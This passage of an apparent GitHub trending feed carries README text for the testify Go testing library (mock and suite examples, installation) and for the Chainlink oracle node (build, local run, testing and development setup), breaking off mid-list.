object that implements an interface&#xA;// that describes an object that the code I am testing relies on.&#xA;type MyMockedObject struct{&#xA;  mock.Mock&#xA;}&#xA;&#xA;// DoSomething is a method on MyMockedObject that implements some interface&#xA;// and just records the activity, and returns what the Mock object tells it to.&#xA;//&#xA;// In the real object, this method would do something useful, but since this&#xA;// is a mocked object - we&#39;re just going to stub it out.&#xA;//&#xA;// NOTE: This method is not being tested here, code that uses this object is.&#xA;func (m *MyMockedObject) DoSomething(number int) (bool, error) {&#xA;&#xA;  args := m.Called(number)&#xA;  return args.Bool(0), args.Error(1)&#xA;&#xA;}&#xA;&#xA;/*&#xA;  Actual test functions&#xA;*/&#xA;&#xA;// TestSomething is an example of how to use our test object to&#xA;// make assertions about some target code we are testing.&#xA;func TestSomething(t *testing.T) {&#xA;&#xA;  // create an instance of our test object&#xA;  testObj := new(MyMockedObject)&#xA;&#xA;  // setup expectations&#xA;  testObj.On(&#34;DoSomething&#34;, 123).Return(true, nil)&#xA;&#xA;  // call the code we are testing&#xA;  targetFuncThatDoesSomethingWithObj(testObj)&#xA;&#xA;  // assert that the expectations were met&#xA;  testObj.AssertExpectations(t)&#xA;&#xA;&#xA;}&#xA;&#xA;// TestSomethingWithPlaceholder is a second example of how to use our test object to&#xA;// make assertions about some target code we are testing.&#xA;// This time using a placeholder. Placeholders might be used when the&#xA;// data being passed in is normally dynamically generated and cannot be&#xA;// predicted beforehand (eg. containing hashes that are time sensitive)&#xA;func TestSomethingWithPlaceholder(t *testing.T) {&#xA;&#xA;  // create an instance of our test object&#xA;  testObj := new(MyMockedObject)&#xA;&#xA;  // setup expectations with a placeholder in the argument list&#xA;  testObj.On(&#34;DoSomething&#34;, mock.Anything).Return(true, nil)&#xA;&#xA;  // call the code we are testing&#xA;  targetFuncThatDoesSomethingWithObj(testObj)&#xA;&#xA;  // assert that the expectations were met&#xA;  testObj.AssertExpectations(t)&#xA;&#xA;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For more information on how to write mock code, check out the &lt;a href=&#34;http://godoc.org/github.com/stretchr/testify/mock&#34;&gt;API documentation for the &lt;code&gt;mock&lt;/code&gt; package&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can use the &lt;a href=&#34;http://github.com/vektra/mockery&#34;&gt;mockery tool&lt;/a&gt; to autogenerate the mock code against an interface as well, making using mocks much quicker.&lt;/p&gt; &#xA;&lt;h2&gt;&lt;a href=&#34;http://godoc.org/github.com/stretchr/testify/suite&#34; title=&#34;API documentation&#34;&gt;&lt;code&gt;suite&lt;/code&gt;&lt;/a&gt; package&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;suite&lt;/code&gt; package provides functionality that you might be used to from more common object oriented languages. With it, you can build a testing suite as a struct, build setup/teardown methods and testing methods on your struct, and run them with &#39;go test&#39; as per normal.&lt;/p&gt; &#xA;&lt;p&gt;An example suite is shown below:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Basic imports&#xA;import (&#xA;    &#34;testing&#34;&#xA;    &#34;github.com/stretchr/testify/assert&#34;&#xA;    &#34;github.com/stretchr/testify/suite&#34;&#xA;)&#xA;&#xA;// Define the suite, and absorb the built-in basic suite&#xA;// functionality from testify - including a T() method which&#xA;// returns the current testing context&#xA;type ExampleTestSuite struct {&#xA;    suite.Suite&#xA;    VariableThatShouldStartAtFive int&#xA;}&#xA;&#xA;// Make sure that VariableThatShouldStartAtFive is set to five&#xA;// before each test&#xA;func (suite *ExampleTestSuite) SetupTest() {&#xA;    suite.VariableThatShouldStartAtFive = 5&#xA;}&#xA;&#xA;// All methods that begin with &#34;Test&#34; are run as tests within a&#xA;// suite.&#xA;func (suite *ExampleTestSuite) TestExample() {&#xA;    assert.Equal(suite.T(), 5, suite.VariableThatShouldStartAtFive)&#xA;}&#xA;&#xA;// In order for &#39;go test&#39; to run this suite, we need to create&#xA;// a normal test function and pass our suite to suite.Run&#xA;func TestExampleTestSuite(t *testing.T) {&#xA;    suite.Run(t, new(ExampleTestSuite))&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For a more complete example, using all of the functionality provided by the suite package, look at our &lt;a href=&#34;https://github.com/stretchr/testify/raw/master/suite/suite_test.go&#34;&gt;example testing suite&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For more information on writing suites, check out the &lt;a href=&#34;http://godoc.org/github.com/stretchr/testify/suite&#34;&gt;API documentation for the &lt;code&gt;suite&lt;/code&gt; package&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Suite&lt;/code&gt; object has assertion methods:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Basic imports&#xA;import (&#xA;    &#34;testing&#34;&#xA;    &#34;github.com/stretchr/testify/suite&#34;&#xA;)&#xA;&#xA;// Define the suite, and absorb the built-in basic suite&#xA;// functionality from testify - including assertion methods.&#xA;type ExampleTestSuite struct {&#xA;    suite.Suite&#xA;    VariableThatShouldStartAtFive int&#xA;}&#xA;&#xA;// Make sure that VariableThatShouldStartAtFive is set to five&#xA;// before each test&#xA;func (suite *ExampleTestSuite) SetupTest() {&#xA;    suite.VariableThatShouldStartAtFive = 5&#xA;}&#xA;&#xA;// All methods that begin with &#34;Test&#34; are run as tests within a&#xA;// suite.&#xA;func (suite *ExampleTestSuite) TestExample() {&#xA;    suite.Equal(suite.VariableThatShouldStartAtFive, 5)&#xA;}&#xA;&#xA;// In order for &#39;go test&#39; to run this suite, we need to create&#xA;// a normal test function and pass our suite to suite.Run&#xA;func TestExampleTestSuite(t *testing.T) {&#xA;    suite.Run(t, new(ExampleTestSuite))&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h1&gt;Installation&lt;/h1&gt; &#xA;&lt;p&gt;To install Testify, use &lt;code&gt;go get&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;go get github.com/stretchr/testify&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will then make the following packages available to you:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;github.com/stretchr/testify/assert&#xA;github.com/stretchr/testify/require&#xA;github.com/stretchr/testify/mock&#xA;github.com/stretchr/testify/suite&#xA;github.com/stretchr/testify/http (deprecated)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Import the &lt;code&gt;testify/assert&lt;/code&gt; package into your code using this template:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package yours&#xA;&#xA;import (&#xA;  &#34;testing&#34;&#xA;  &#34;github.com/stretchr/testify/assert&#34;&#xA;)&#xA;&#xA;func TestSomething(t *testing.T) {&#xA;&#xA;  assert.True(t, true, &#34;True is true!&#34;)&#xA;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h1&gt;Staying up to date&lt;/h1&gt; &#xA;&lt;p&gt;To update Testify to the latest version, use &lt;code&gt;go get -u github.com/stretchr/testify&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h1&gt;Supported go versions&lt;/h1&gt; &#xA;&lt;p&gt;We currently support the most recent major Go versions from 1.13 onward.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h1&gt;Contributing&lt;/h1&gt; &#xA;&lt;p&gt;Please feel free to submit issues, fork the repository and send pull requests!&lt;/p&gt; &#xA;&lt;p&gt;When submitting an issue, we ask that you please include a complete test function that demonstrates the issue. Extra credit for those using Testify to write the test code that demonstrates it.&lt;/p&gt; &#xA;&lt;p&gt;Code generation is used. Look for &lt;code&gt;CODE GENERATED AUTOMATICALLY&lt;/code&gt; at the top of some files. Run &lt;code&gt;go generate ./...&lt;/code&gt; to update generated files.&lt;/p&gt; &#xA;&lt;p&gt;We also chat on the &lt;a href=&#34;https://gophers.slack.com&#34;&gt;Gophers Slack&lt;/a&gt; group in the &lt;code&gt;#testify&lt;/code&gt; and &lt;code&gt;#testify-dev&lt;/code&gt; channels.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h1&gt;License&lt;/h1&gt; &#xA;&lt;p&gt;This project is licensed under the terms of the MIT license.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>smartcontractkit/chainlink</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/smartcontractkit/chainlink</id>
    <link href="https://github.com/smartcontractkit/chainlink" rel="alternate"></link>
    <summary type="html">&lt;p&gt;node of the decentralized oracle network, bridging on and off-chain computation&lt;/p&gt;&lt;hr&gt;&lt;br&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://chain.link&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/smartcontractkit/chainlink/develop/docs/logo-chainlink-blue.svg?sanitize=true&#34; width=&#34;225&#34; alt=&#34;Chainlink logo&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/smartcontract/chainlink/tags&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/v/tag/smartcontractkit/chainlink?style=flat-square&#34; alt=&#34;GitHub tag (latest SemVer)&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/smartcontractkit/chainlink/raw/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/smartcontractkit/chainlink?style=flat-square&#34; alt=&#34;GitHub license&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/smartcontractkit/chainlink/actions?query=workflow%3AChangelog&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/workflow/status/smartcontractkit/chainlink/Changelog?style=flat-square&amp;amp;label=github-actions&#34; alt=&#34;GitHub workflow changelog&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://circleci.com/gh/smartcontractkit/chainlink/tree/master&#34;&gt;&lt;img src=&#34;https://img.shields.io/circleci/build/github/smartcontractkit/chainlink/master?style=flat-square&amp;amp;label=circleci&amp;amp;logo=circleci&#34; alt=&#34;CircleCI build&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/smartcontractkit/chainlink/graphs/contributors&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/contributors-anon/smartcontractkit/chainlink?style=flat-square&#34; alt=&#34;GitHub contributors&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/smartcontractkit/chainlink/commits/master&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/commit-activity/y/smartcontractkit/chainlink?style=flat-square&#34; alt=&#34;GitHub commit activity&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://docs.chain.link/&#34;&gt;&lt;img src=&#34;https://img.shields.io/static/v1?label=docs&amp;amp;message=latest&amp;amp;color=blue&#34; alt=&#34;Official documentation&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://chain.link/&#34;&gt;Chainlink&lt;/a&gt; expands the capabilities of smart contracts by enabling access to real-world data and off-chain computation while maintaining the security and reliability guarantees inherent to blockchain technology.&lt;/p&gt; &#xA;&lt;p&gt;This repo contains the Chainlink core node, operator UI and contracts. The core node is the bundled binary available to be run by node operators participating in a &lt;a href=&#34;https://link.smartcontract.com/whitepaper&#34;&gt;decentralized oracle network&lt;/a&gt;. All major release versions have pre-built docker images available for download from the &lt;a href=&#34;https://hub.docker.com/r/smartcontract/chainlink/tags&#34;&gt;Chainlink dockerhub&lt;/a&gt;. If you are interested in contributing please see our &lt;a href=&#34;https://raw.githubusercontent.com/smartcontractkit/chainlink/develop/docs/CONTRIBUTING.md&#34;&gt;contribution guidelines&lt;/a&gt;. If you are here to report a bug or request a feature, please &lt;a href=&#34;https://github.com/smartcontractkit/chainlink/issues&#34;&gt;check currently open Issues&lt;/a&gt;. For more information about how to get started with Chainlink, check our &lt;a href=&#34;https://docs.chain.link/&#34;&gt;official documentation&lt;/a&gt;. Resources for Solidity developers can be found in the &lt;a href=&#34;https://github.com/smartcontractkit/hardhat-starter-kit&#34;&gt;Chainlink Hardhat Box&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Community&lt;/h2&gt; &#xA;&lt;p&gt;Chainlink has an active and ever growing community. &lt;a href=&#34;https://discordapp.com/invite/aSK4zew&#34;&gt;Discord&lt;/a&gt; is the primary communication channel used for day to day communication, answering development questions, and aggregating Chainlink related content. Take a look at the &lt;a href=&#34;https://raw.githubusercontent.com/smartcontractkit/chainlink/develop/docs/COMMUNITY.md&#34;&gt;community docs&lt;/a&gt; for more information regarding Chainlink social accounts, news, and networking.&lt;/p&gt; &#xA;&lt;h2&gt;Build Chainlink&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://golang.org/doc/install&#34;&gt;Install Go 1.18&lt;/a&gt;, and add your GOPATH&#39;s &lt;a href=&#34;https://golang.org/doc/code.html#GOPATH&#34;&gt;bin directory to your PATH&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Example Path for macOS &lt;code&gt;export PATH=$GOPATH/bin:$PATH&lt;/code&gt; &amp;amp; &lt;code&gt;export GOPATH=/Users/$USER/go&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Install &lt;a href=&#34;https://nodejs.org/en/download/package-manager/&#34;&gt;NodeJS&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://yarnpkg.com/lang/en/docs/install/&#34;&gt;Yarn&lt;/a&gt;. See the current version in &lt;code&gt;package.json&lt;/code&gt; at the root of this repo under the &lt;code&gt;engines.node&lt;/code&gt; key. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;It might be easier long term to use &lt;a href=&#34;https://nodejs.org/en/download/package-manager/#nvm&#34;&gt;nvm&lt;/a&gt; to switch between node versions for different projects. For example, assuming $NODE_VERSION was set to a valid version of NodeJS, you could run: &lt;code&gt;nvm install $NODE_VERSION &amp;amp;&amp;amp; nvm use $NODE_VERSION&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Install &lt;a href=&#34;https://wiki.postgresql.org/wiki/Detailed_installation_guides&#34;&gt;Postgres (&amp;gt;= 11.x)&lt;/a&gt;. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;You should &lt;a href=&#34;https://www.postgresql.org/docs/12/ssl-tcp.html&#34;&gt;configure Postgres&lt;/a&gt; to use SSL connection (or for testing you can set &lt;code&gt;?sslmode=disable&lt;/code&gt; in your Postgres query string).&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Ensure you have Python 3 installed (this is required by &lt;a href=&#34;https://github.com/crytic/solc-select&#34;&gt;solc-select&lt;/a&gt; which is needed to compile solidity contracts)&lt;/li&gt; &#xA; &lt;li&gt;Download Chainlink: &lt;code&gt;git clone https://github.com/smartcontractkit/chainlink &amp;amp;&amp;amp; cd chainlink&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Build and install Chainlink: &lt;code&gt;make install&lt;/code&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;If you got any errors regarding locked yarn package, try running &lt;code&gt;yarn install&lt;/code&gt; before this step&lt;/li&gt; &#xA;   &lt;li&gt;If &lt;code&gt;yarn install&lt;/code&gt; throws a network connection error, try increasing the network timeout by running &lt;code&gt;yarn install --network-timeout 150000&lt;/code&gt; before this step&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Run the node: &lt;code&gt;chainlink help&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;For the latest information on setting up a development environment, see the &lt;a href=&#34;https://github.com/smartcontractkit/chainlink/wiki/Development-Setup-Guide&#34;&gt;Development Setup Guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Mac M1/ARM64 [EXPERIMENTAL]&lt;/h3&gt; &#xA;&lt;p&gt;Chainlink can be experimentally compiled with ARM64 as the target arch. You may run into errors with cosmwasm:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# github.com/CosmWasm/wasmvm/api&#xA;ld: warning: ignoring file ../../../.asdf/installs/golang/1.18/packages/pkg/mod/github.com/!cosm!wasm/wasmvm@v0.16.3/api/libwasmvm.dylib, building for macOS-arm64 but attempting to link with file built for macOS-x86_64&#xA;Undefined symbols for architecture arm64:# github.com/CosmWasm/wasmvm/api&#xA;ld: warning: ignoring file ../../../.asdf/installs/golang/1.18/packages/pkg/mod/github.com/!cosm!wasm/wasmvm@v0.16.3/api/libwasmvm.dylib, building for macOS-arm64 but attempting to link with file built for macOS-x86_64&#xA;Undefined symbols for architecture arm64:&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In this case, try the following steps:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;code&gt;git clone git@github.com:mandrean/terra-core.git&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cd terra-core; git checkout feat/multiarch&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;make install; cd ..&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;go work init /path/to/chainlink&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;go work use /path/to/terra-core&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Ethereum Node Requirements&lt;/h3&gt; &#xA;&lt;p&gt;In order to run the Chainlink node you must have access to a running Ethereum node with an open websocket connection. Any Ethereum based network will work once you&#39;ve &lt;a href=&#34;https://github.com/smartcontractkit/chainlink#configure&#34;&gt;configured&lt;/a&gt; the chain ID. Ethereum node versions currently tested and supported:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/openethereum/openethereum&#34;&gt;Parity/Openethereum&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ethereum/go-ethereum/releases&#34;&gt;Geth&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/NethermindEth/nethermind&#34;&gt;Nethermind&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;We cannot recommend specific version numbers for ethereum nodes since the software is being continually updated, but you should usually try to run the latest version available.&lt;/p&gt; &#xA;&lt;h2&gt;Running a local Chainlink node&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: By default, chainlink will run in TLS mode. For local development you can disable this by setting the following env vars:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;CHAINLINK_DEV=true&#xA;CHAINLINK_TLS_PORT=0&#xA;SECURE_COOKIES=false&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Alternatively, you can generate self signed certificates using &lt;code&gt;tools/bin/self-signed-certs&lt;/code&gt; or &lt;a href=&#34;https://github.com/smartcontractkit/chainlink/wiki/Creating-Self-Signed-Certificates&#34;&gt;manually&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To start your Chainlink node, simply run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;chainlink node start&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;By default this will start on port 6688. You should be able to access the UI at &lt;a href=&#34;http://localhost:6688/&#34;&gt;http://localhost:6688/&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Chainlink provides a remote CLI client as well as a UI. Once your node has started, you can open a new terminal window to use the CLI. You will need to log in to authorize the client first:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;chainlink admin login&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(You can also set &lt;code&gt;ADMIN_CREDENTIALS_FILE=/path/to/credentials/file&lt;/code&gt; in future if you like, to avoid having to login again).&lt;/p&gt; &#xA;&lt;p&gt;Now you can view your current jobs with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;chainlink jobs list&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To find out more about the Chainlink CLI, you can always run &lt;code&gt;chainlink help&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Check out the &lt;a href=&#34;https://docs.chain.link/&#34;&gt;doc&lt;/a&gt; pages on &lt;a href=&#34;https://docs.chain.link/docs/jobs/&#34;&gt;Jobs&lt;/a&gt; to learn more about how to create Jobs.&lt;/p&gt; &#xA;&lt;h3&gt;Configuration&lt;/h3&gt; &#xA;&lt;p&gt;Node configuration is managed by a combination of environment variables and direct setting via API/UI/CLI.&lt;/p&gt; &#xA;&lt;p&gt;Check the &lt;a href=&#34;https://docs.chain.link/docs/configuration-variables&#34;&gt;official documentation&lt;/a&gt; for more information on how to configure your node.&lt;/p&gt; &#xA;&lt;h3&gt;External Adapters&lt;/h3&gt; &#xA;&lt;p&gt;External adapters are what make Chainlink easily extensible, providing simple integration of custom computations and specialized APIs. A Chainlink node communicates with external adapters via a simple REST API.&lt;/p&gt; &#xA;&lt;p&gt;For more information on creating and using external adapters, please see our &lt;a href=&#34;https://docs.chain.link/docs/external-adapters&#34;&gt;external adapters page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Development&lt;/h2&gt; &#xA;&lt;h3&gt;Running tests&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://yarnpkg.com/lang/en/docs/install&#34;&gt;Install Yarn&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Install &lt;a href=&#34;https://github.com/fjl/gencodec&#34;&gt;gencodec&lt;/a&gt; and &lt;a href=&#34;https://stedolan.github.io/jq/download/&#34;&gt;jq&lt;/a&gt; to be able to run &lt;code&gt;go generate ./...&lt;/code&gt; and &lt;code&gt;make abigen&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Install mockery&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;code&gt;make mockery&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Using the &lt;code&gt;make&lt;/code&gt; command will install the correct version.&lt;/p&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;Build contracts:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;yarn&#xA;yarn setup:contracts&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;Generate and compile static assets:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go generate ./...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;5&#34;&gt; &#xA; &lt;li&gt;Prepare your development environment:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export DATABASE_URL=postgresql://127.0.0.1:5432/chainlink_test?sslmode=disable&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: Other environment variables should not be set for all tests to pass&lt;/p&gt; &#xA;&lt;ol start=&#34;6&#34;&gt; &#xA; &lt;li&gt;Drop/Create test database and run migrations:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;go run ./core/main.go local db preparetest&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you do end up modifying the migrations for the database, you will need to rerun&lt;/p&gt; &#xA;&lt;ol start=&#34;7&#34;&gt; &#xA; &lt;li&gt;Run tests:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go test ./...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Notes&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The &lt;code&gt;parallel&lt;/code&gt; flag can be used to limit CPU usage, for running tests in the background (&lt;code&gt;-parallel=4&lt;/code&gt;) - the default is &lt;code&gt;GOMAXPROCS&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;The &lt;code&gt;p&lt;/code&gt; flag can be used to limit the number of &lt;em&gt;packages&lt;/em&gt; tested concurrently, if they are interferring with one another (&lt;code&gt;-p=1&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;The &lt;code&gt;-short&lt;/code&gt; flag skips tests which depend on the database, for quickly spot checking simpler tests in around one minute (you may still need a phony env var to pass some validation: &lt;code&gt;DATABASE_URL=_test&lt;/code&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Race Detector&lt;/h4&gt; &#xA;&lt;p&gt;As of Go 1.1, the runtime includes a data race detector, enabled with the &lt;code&gt;-race&lt;/code&gt; flag. This is used in CI via the &lt;code&gt;tools/bin/go_core_race_tests&lt;/code&gt; script. If the action detects a race, the artifact on the summary page will include &lt;code&gt;race.*&lt;/code&gt; files with detailed stack traces.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;em&gt;&lt;strong&gt;It will not issue false positives, so take its warnings seriously.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;For local, targeted race detection, you can run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;GORACE=&#34;log_path=$PWD/race&#34; go test -race ./core/path/to/pkg -count 10&#xA;GORACE=&#34;log_path=$PWD/race&#34; go test -race ./core/path/to/pkg -count 100 -run TestFooBar/sub_test &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://go.dev/doc/articles/race_detector&#34;&gt;https://go.dev/doc/articles/race_detector&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Fuzz tests&lt;/h4&gt; &#xA;&lt;p&gt;As of Go 1.18, fuzz tests &lt;code&gt;func FuzzXXX(*testing.F)&lt;/code&gt; are included as part of the normal test suite, so existing cases are executed with &lt;code&gt;go test&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Additionally, you can run active fuzzing to search for new cases:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go test ./pkg/path -run=XXX -fuzz=FuzzTestName&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://go.dev/doc/fuzz/&#34;&gt;https://go.dev/doc/fuzz/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Solidity&lt;/h3&gt; &#xA;&lt;p&gt;Inside the &lt;code&gt;contracts/&lt;/code&gt; directory:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Install dependencies:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;yarn&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Run tests:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;yarn test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Code Generation&lt;/h3&gt; &#xA;&lt;p&gt;Go generate is used to generate mocks in this project. Mocks are generated with &lt;a href=&#34;https://github.com/vektra/mockery&#34;&gt;mockery&lt;/a&gt; and live in core/internal/mocks.&lt;/p&gt; &#xA;&lt;h3&gt;Nix Flake&lt;/h3&gt; &#xA;&lt;p&gt;A &lt;a href=&#34;https://nixos.wiki/wiki/Flakes&#34;&gt;flake&lt;/a&gt; is provided for use with the &lt;a href=&#34;https://nixos.org/&#34;&gt;Nix package manager&lt;/a&gt;. It defines a declarative, reproducible development environment.&lt;/p&gt; &#xA;&lt;p&gt;To use it:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nixos.wiki/wiki/Flakes#Installing_flakes&#34;&gt;Nix has to be installed with flake support&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Run &lt;code&gt;nix develop&lt;/code&gt;. You will be put in shell containing all the dependencies. Alternatively, a &lt;code&gt;direnv&lt;/code&gt; integration exists to automatically change the environment when &lt;code&gt;cd&lt;/code&gt;-ing into the folder.&lt;/li&gt; &#xA; &lt;li&gt;Create a local postgres database:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd $PGDATA/&#xA;initdb&#xA;pg_ctl -l $PGDATA/postgres.log -o &#34;--unix_socket_directories=&#39;$PWD&#39;&#34; start&#xA;createdb chainlink_test -h localhost&#xA;createuser --superuser --no-password chainlink -h localhost&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;Start postgres, &lt;code&gt;pg_ctl -l 